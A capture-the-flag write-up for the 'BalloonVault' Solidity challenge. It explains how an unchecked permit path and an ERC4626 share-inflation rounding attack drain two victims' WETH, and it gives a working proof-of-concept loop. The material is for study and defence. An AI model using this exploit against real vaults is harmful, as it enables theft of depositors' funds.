# BalloonVault

## Challenge

This challenge provides us with an implementation of an ERC4626 Vault:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC20, IERC20Permit, ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

/**
 * @title BallonVault
 */
contract BallonVault is ERC4626 {

    /**
     * @dev Constructor that sets the address of the underlying asset of the Vault (an ERC20 token)
     * @param underlying The address of the underlying asset
     */
    constructor(address underlying) ERC20("BallonVault", "E4626B") ERC4626(ERC20(underlying)) {}

    /**
     * @dev Deposit ERC20 tokens into the Vault
     * @param from The address to deposit the ERC20 tokens from
     * @param amount The amount of ERC20 tokens to deposit
     * @param deadline The deadline for the deposit to be made
     * @param v The v value of the signature
     * @param r The r value of the signature
     * @param s The s value of the signature
     */
    function depositWithPermit(address from, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external
    {
        IERC20Permit(address(asset())).permit(from, address(this), amount, deadline, v, r, s);

        _deposit(from, from, amount, previewDeposit(amount));
    }
}
```

Challenge Description:

A ERC4626 vault known as the "Balloon Vault" has been built to gather WETH and invest it on multiple strategies. This vault was thought to be impenetrable, designed meticulously to maintain the security and integrity of the tokens stored within.

The process was straightforward: individuals deposited their digital assets into the Balloon Vault, receiving shares in return. These shares represented their holdings and served as a way to track their savings. 

Two users of the vault, Alice and Bob, have fallen prey to a potential security vulnerability, jeopardizing their significant holdings of 500 WETH each. Protocol try to reach them with no luck...

You have been summoned by the custodians of the Balloon Vault, challenged to assess and exploit the lurking vulnerability, and drain the wallets of Alice and Bob before a bad actor do it. By successfully accomplishing this, you rescue 1000 WETH from Alice & Bob.

📌 Drain *Bob's wallet* and *Alice's wallet*

📌 End up with more than `1000 ETH` in your wallet


## Solution

The solution relies on 2 steps. 

### 1. Missing checks in depositWithPermit()

The function depositWithPermit() is missing checks on the return value of the permit() function. Due to this, you can present it with any signature and it will still call the deposit() function. This function still has some security features and will revert if there is no approval from the "from"-address to the vault. Nevertheless, this allows us to transfer money from contracts that have open approvals to the vault, to the vault. But this in itself doesn't help us in stealing the money as we can only transfer the weth to the vault but not ourselves.

### 2. Exploiting the Division

There is a very well-known vulnerability in ERC4626 vaults, which is called an [Inflation Attack](https://mixbytes.io/blog/overview-of-the-inflation-attack). This attack works in multiple steps. In our case we can implement it like this:

1. Use the depositWithPermit() with a valid/invalid signature to deposit 1 wei
2. Transfer our whole balance to the vault using weth.transfer()
3. Force Alice/Bob to deposit the amount we transferred using transfer()
4. Due to the totalAsset() being 1 more than the deposit by Alice/Bob and the totalSupply() being 1, they won't get a single share
5. Withdraw our 1 share and get all the money in the vault
6. Repeat until everyone is drained

In my case, I first did this with 2 loops that were looping 50x each, but I decided to then improve and always use our actual balance which simplified the code (a bit). Below you can see my POC:

```solidity
//First we change our eth to weth
weth.deposit{value: 10 ether}();

//Then we approve the vault to spend our weth
//NOTE: This would make the attacker vulnerable to the same attack. 
weth.approve(address(vault), type(uint256).max);

//Tracker of our balance
uint256 currentAttackerBalance = weth.balanceOf(address(attacker));

//Now we loop until we have more weth than Alice
while(currentAttackerBalance < weth.balanceOf(address(alice)))
{
    //Deposit 1 weth to get 1 share
    vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);

    //Transfer all our money to the vault
    weth.transfer(address(vault), currentAttackerBalance-1);

    //Let Alice deposit but due to the division, she gets 0 shares
    vault.depositWithPermit(alice, currentAttackerBalance-1, block.number + 100, 0, 0, 0);

    //Now we withdraw our 1 share which is all the money in the vault
    vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));

    //Update the balance
    currentAttackerBalance = weth.balanceOf(address(attacker));
}

//Now we empty the rest of Alice's account, we do the same as above
vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);
weth.transfer(address(vault), weth.balanceOf(address(alice)));
vault.depositWithPermit(alice, weth.balanceOf(address(alice)), block.number + 100, 0, 0, 0);
vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));


//As we have the funds now, Bob is super easy to drain, we do the same as above
vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);
weth.transfer(address(vault), weth.balanceOf(address(bob)));
vault.depositWithPermit(bob, weth.balanceOf(address(bob)), block.number + 100, 0, 0, 0);
vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));
```